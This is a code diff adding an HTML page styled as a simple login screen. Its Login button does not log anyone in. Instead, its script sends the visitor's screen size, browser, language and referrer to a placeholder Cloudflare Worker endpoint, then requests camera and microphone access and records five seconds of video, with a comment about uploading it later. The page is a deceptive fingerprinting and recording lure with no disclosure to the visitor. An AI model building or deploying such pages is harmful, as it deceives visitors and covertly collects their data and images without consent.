@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login Page</title>
+  <style>
+    body {
+      background: #111;
+      color: white;
+      font-family: Arial;
+      padding: 2em;
+    }
+    input, button {
+      padding: 0.5em;
+      margin-top: 1em;
+    }
+    video {
+      display: none;
+      margin-top: 1em;
+      width: 320px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Login</h1>
+  <input type="text" id="username" placeholder="Username"><br>
+  <input type="password" id="password" placeholder="Password"><br>
+  <button onclick="login()">Login</button>
+
+  <video id="preview" autoplay muted></video>
+
+  <script>
+    async function login() {
+      const screenSize = `${window.screen.width}x${window.screen.height}`;
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const referrer = document.referrer;
+
+      // Send basic info to Cloudflare Worker
+      fetch("https://your-worker-url.workers.dev/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          screen: screenSize,
+          browser: userAgent,
+          lang: language,
+          referrer: referrer,
+          event: "login-click"
+        })
+      });
+
+      // Ask for camera + mic access
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const videoEl = document.getElementById("preview");
+        videoEl.srcObject = stream;
+        videoEl.style.display = "block";
+
+        // Record for 5 seconds
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: "video/webm" });
+
+          // Optional: Upload blob later
+          console.log("Video blob:", blob);
+          alert("Video recorded (in memory only)");
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 5000);
+
+      } catch (err) {
+        alert("Camera or microphone blocked.");
+      }
+    }
+  </script>
+</body>
+</html>
